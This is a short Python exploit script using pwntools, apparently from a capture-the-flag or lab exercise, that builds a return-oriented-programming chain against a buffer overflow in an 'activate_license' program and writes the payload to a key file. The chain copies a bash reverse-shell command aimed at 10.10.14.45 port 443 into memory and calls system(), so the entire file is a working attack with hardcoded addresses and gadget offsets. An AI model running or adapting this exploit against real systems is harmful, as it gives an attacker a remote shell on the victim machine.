#!/usr/bin/python3

from pwn import *


def exploit():
    base_activate_license = 0x5570d2cdb000 
    base_libc = 0x7fda1497d000
    writable = base_activate_license + 0x00004000
    system = base_libc + 0x00048e50
    
    
    pop_rdi = p64(base_libc + 0x00026796)
    pop_rsi = p64(base_libc + 0x0002890f)
    mov_rdi_rsi = p64(base_libc + 0x000603b2)

    offset = 520 
    exploit  = b''
    exploit += b'A'* offset
    shell = b"bash -c 'bash -i >& /dev/tcp/10.10.14.45/443 0>&1'"

    for x in range(0, len(shell), 8):
        exploit += pop_rdi
        exploit += p64(writable + x)
        exploit += pop_rsi
        exploit += shell[x: x+8].ljust(8, b'\x00')
        exploit += mov_rdi_rsi
        
    exploit += pop_rdi
    exploit += p64(writable)
    exploit += p64(system)
    
    with open("dick.key", "wb") as file:
        file.write(exploit)



if __name__ == "__main__":
    exploit()
